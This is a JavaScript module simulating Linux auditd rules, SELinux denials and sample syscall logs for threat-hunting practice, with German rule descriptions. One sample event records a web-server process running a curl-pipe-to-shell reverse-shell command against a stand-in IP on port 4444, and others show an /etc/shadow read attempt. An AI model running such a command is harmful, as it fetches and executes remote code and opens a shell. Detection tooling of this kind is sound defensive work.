// @ts-check
/**
 * Linux Auditd & eBPF Tracepoint Security Engine
 * Simulates Linux Kernel Syscall Auditing (execve, openat, connect, setuid),
 * Auditd rule syntax (-w /path, -a always,exit -F arch=b64 -S ... -k key),
 * and SELinux AVC Denial Event parsing for threat hunting.
 */

/**
 * @typedef {Object} AuditdRule
 * @property {string} id Rule ID
 * @property {string} syntax Full auditctl/audit.rules syntax
 * @property {string} description What threat vector this rule monitors
 * @property {string} key Audit filter key tag (-k tag)
 * @property {'FILE_WATCH' | 'SYSCALL_FILTER'} type
 */

/**
 * @typedef {Object} SyscallEvent
 * @property {number} id Event ID
 * @property {string} timestamp ISO timestamp
 * @property {string} syscall Syscall name (e.g. 'execve', 'connect', 'setuid')
 * @property {number} pid Process ID
 * @property {string} comm Process executable name (e.g. 'curl', 'bash', 'sudo')
 * @property {string} user Current user (e.g. 'www-data', 'root')
 * @property {string} target Target path or socket (e.g. '/etc/shadow', '198.51.100.2:4444')
 * @property {'SUCCESS' | 'DENIED_EACCES' | 'SELINUX_AVC_DENIAL'} status
 * @property {'LOW' | 'MEDIUM' | 'CRITICAL'} severity
 * @property {string} threatDescription Threat intelligence interpretation
 */

/**
 * Standard Linux Production Auditd Rules for IHK and Enterprise Hardening
 * @type {AuditdRule[]}
 */
export const STANDARD_AUDITD_RULES = [
  {
    id: 'rule_shadow_watch',
    syntax: '-w /etc/shadow -p wa -k identity_tampering',
    description: 'Überwacht Schreib- und Attributänderungen an /etc/shadow (Passwort-Hashes).',
    key: 'identity_tampering',
    type: 'FILE_WATCH'
  },
  {
    id: 'rule_privilege_escalation',
    syntax: '-a always,exit -F arch=b64 -S setuid,setgid,setresuid -F a0=0 -k privilege_escalation',
    description: 'Erfasst Versuche von Prozessen, zu UID 0 (root) zu eskalieren.',
    key: 'privilege_escalation',
    type: 'SYSCALL_FILTER'
  },
  {
    id: 'rule_unauthorized_execve',
    syntax: '-a always,exit -F arch=b64 -S execve -F euid=33 -k webserver_shell_spawn',
    description: 'Erkennt, wenn der Webserver-User (www-data, UID 33) eine Shell oder Binaries spawnt (z.B. Remote Code Execution RCE).',
    key: 'webserver_shell_spawn',
    type: 'SYSCALL_FILTER'
  },
  {
    id: 'rule_kernel_modules',
    syntax: '-a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k rootkit_module',
    description: 'Erfasst das Laden und Entladen von Kernel-Modulen (Schutz vor Rootkits).',
    key: 'rootkit_module',
    type: 'SYSCALL_FILTER'
  }
];

/**
 * Pre-configured simulated auditd & eBPF trace event logs
 * @type {SyscallEvent[]}
 */
export const SAMPLE_SYSCALL_LOGS = [
  {
    id: 101,
    timestamp: '2026-09-26T10:14:02Z',
    syscall: 'execve',
    pid: 4092,
    comm: 'nginx',
    user: 'www-data',
    target: '/bin/bash -c "curl http://198.51.100.2:4444/rev.sh | sh"',
    status: 'SUCCESS',
    severity: 'CRITICAL',
    threatDescription: 'RCE Exploit Alert: www-data spawned an interactive shell executing a reverse shell.'
  },
  {
    id: 102,
    timestamp: '2026-09-26T10:14:05Z',
    syscall: 'openat',
    pid: 4094,
    comm: 'sh',
    user: 'www-data',
    target: '/etc/shadow',
    status: 'DENIED_EACCES',
    severity: 'MEDIUM',
    threatDescription: 'Unauthorized Access: Webserver attempted to read password hashes directly (blocked by DAC permissions 0640).'
  },
  {
    id: 103,
    timestamp: '2026-09-26T10:15:10Z',
    syscall: 'connect',
    pid: 4094,
    comm: 'curl',
    user: 'www-data',
    target: '198.51.100.2:4444',
    status: 'SELINUX_AVC_DENIAL',
    severity: 'CRITICAL',
    threatDescription: 'SELinux Type Enforcement: httpd_t was denied name_connect on port 4444 by MAC policy.'
  },
  {
    id: 104,
    timestamp: '2026-09-26T10:16:30Z',
    syscall: 'setresuid',
    pid: 5120,
    comm: 'sudo',
    user: 'admin',
    target: 'UID: 0 (root)',
    status: 'SUCCESS',
    severity: 'LOW',
    threatDescription: 'Legitimate Administrator Sudo Transition.'
  }
];

/**
 * Evaluates whether an observed syscall matches an auditd rule
 * @param {SyscallEvent} event
 * @param {AuditdRule[]} rules
 * @returns {Array<AuditdRule>}
 */
export function matchEventToRules(event, rules) {
  return rules.filter(r => {
    if (r.type === 'FILE_WATCH' && event.target.includes('/etc/shadow')) {
      return true;
    }
    if (r.key === 'webserver_shell_spawn' && event.user === 'www-data' && event.syscall === 'execve') {
      return true;
    }
    if (r.key === 'privilege_escalation' && (event.syscall.includes('setuid') || event.syscall.includes('setresuid'))) {
      return true;
    }
    return false;
  });
}

/**
 * Filters events by severity and status
 * @param {SyscallEvent[]} events
 * @param {string} [severityFilter='ALL']
 * @returns {SyscallEvent[]}
 */
export function filterSecurityEvents(events, severityFilter = 'ALL') {
  if (!severityFilter || severityFilter === 'ALL') return events;
  return events.filter(e => e.severity === severityFilter);
}
